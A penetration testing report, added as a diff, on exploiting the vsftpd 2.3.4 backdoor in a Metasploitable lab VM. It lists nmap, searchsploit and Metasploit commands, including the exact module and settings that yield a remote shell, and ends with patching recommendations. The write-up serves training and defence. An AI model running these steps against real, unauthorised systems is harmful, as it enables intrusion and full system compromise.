@@ -1,0 +1,65 @@
+Penetration Testing Report: Exploiting vsftpd 2.3.4 Backdoor
+
+1. Objective
+The goal of this test was to identify and exploit known vulnerabilities in the Metasploitable virtual machine, specifically targeting the vsftpd 2.3.4 service.
+
+2. Environment Setup
+- Target System: Metasploitable (Linux-based vulnerable VM)
+- Attacker System: Kali Linux
+- Tools Used:
+  - ifconfig (to identify target IP)
+  - nmap (for service enumeration and vulnerability detection)
+  - searchsploit (to locate public exploits)
+  - msfconsole (Metasploit Framework for exploitation)
+
+3. Methodology
+
+Step 1: Identifying Target IP
+- Used ifconfig to determine the IP address of the Metasploitable VM.
+- Example output: 192.168.x.x
+
+Step 2: Service Enumeration
+- Ran a comprehensive Nmap scan:
+  nmap -A <target-ip>
+- Findings:
+  - FTP service running on port 21
+  - Version detected: vsftpd 2.3.4
+  - Known to contain a malicious backdoor vulnerability.
+
+Step 3: Vulnerability Research
+- Used searchsploit to confirm available exploits:
+  searchsploit vsftpd 2.3.4
+- Results:
+  - vsftpd 2.3.4 - Backdoor Command Execution
+  - vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)
+
+Step 4: Exploitation with Metasploit
+- Launched Metasploit console:
+  msfconsole
+- Searched for exploit:
+  search vsftpd
+- Selected exploit module:
+  use exploit/unix/ftp/vsftpd_234_backdoor
+- Set target IP:
+  set RHOST <target-ip>
+- Executed exploit:
+  exploit
+
+Step 5: Gaining Shell Access
+- Exploit successfully triggered the backdoor.
+- Result: Obtained a command shell on the target system.
+- This confirmed the vulnerability and demonstrated remote code execution capability.
+
+4. Results
+- Vulnerability Confirmed: vsftpd 2.3.4 backdoor.
+- Impact: Remote attackers can gain unauthorized shell access.
+- Risk Level: Critical (full system compromise possible).
+
+5. Recommendations
+- Upgrade vsftpd: Immediately update to a secure version (later than 2.3.4).
+- Restrict FTP Access: Limit exposure of FTP services to trusted networks.
+- Use IDS/IPS: Deploy intrusion detection/prevention systems to monitor suspicious activity.
+- Regular Patch Management: Ensure vulnerable services are updated promptly.
+
+6. Conclusion
+This penetration test demonstrated how a well-known backdoor in vsftpd 2.3.4 can be exploited using Metasploit to gain shell access. The exercise highlights the importance of patch management and proactive vulnerability scanning in securing network services.
